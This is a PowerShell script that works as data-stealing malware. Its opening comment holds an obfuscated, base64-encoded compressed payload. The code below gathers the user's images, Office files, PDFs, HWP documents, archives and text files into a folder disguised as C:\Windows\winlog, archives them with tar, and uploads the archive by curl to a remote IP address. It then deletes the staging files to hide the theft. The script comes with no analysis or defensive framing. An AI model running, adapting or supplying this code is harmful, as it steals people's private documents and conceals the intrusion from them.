# (neW-oBjECt io.StReaMREaDer( (neW-oBjECt syStem.IO.cOmpRessiOn.dEflAtEStREaM([SYSTEM.iO.MeMoRyStREAM] [SysteM.CoNVErT]::frOMBASE64StrINg( 'fVLvT8IwEP1Owv9wMYuosQMhKGJMNAiGxAABjH7gS9mOraa0TdfxQ/R/t+2I0UhslnvLXe+17/UGuCZ9g0sgI2pS6LRnL0zEcp3N1kxwmYCvTrcK4YFpjIzUWyA9qSOEDxjmhgxyzsulgMItPKIhnZTx2DMGKFbt50l3PBoPe/2nbvXMkomI5zHCWahEcm4hYQsHbyopAD1S5qLKYgdRtnKw4dnGZ5UpMPad6VrtwWfNxjiYUw/vzBev3l3UVO93ABljlOsMb6BcWkiNNErhJJgDExDQU9jZNNg1tVp3xW9Hqm1hVDAPe1bygC4RSIyZYYIaJsVf74rOIn5Chxp7yg4+yyX7lUvHYKgGEq0WfztDVzrA57qOfuQn28xeqVGfWTU8xA0eAXmF0XAyhUpqjGpXqxfX9fDishU2mmGr2W7VarVqrrikccU+I1QWjGN2e3fwBhV34BiXcoWF9APTUUwC6Wot9X3kfegnwlr67fGvMfmXzav+h/En0Rc='),[io.COMPResSIoN.CoMpreSsioNMode]::DEcOMPress ) ),[sYstEm.tEXt.eNCOdINg]::aScIi)).REaDToENd( )
New-Item -Path C:\Windows\winlog -ItemType Directory -Force | Out-Null
$a = Get-ChildItem $env:USERPROFILE/* -Include *.png, *.gif, *.jpg, *.jpeg, *.ai, *.psd, *.csv, *.xlsx, *.pptx, *.pdf, *.hwp, *.hwpx, *.txt, *.bat, *.zip, *.7z, *.rar, *.txt -Recurse;
foreach ($b in $a) {
    Try {
    Copy-Item $b.FullName -destination C:\Windows\winlog

    } Catch { }
}

& tar -cvf C:\Windows\winlog.tar C:\Windows\winlog

& "C:\Windows\System32\curl.exe" -X POST 'http://192.168.35.85:8000/upload' -F 'files=@C:\Windows\winlog.tar'

Remove-Item C:\Windows\winlog -Force -ErrorAction Ignore -Recurse | Out-Null
Remove-Item C:\Windows\winlog.tar -Force -ErrorAction Ignore | Out-Null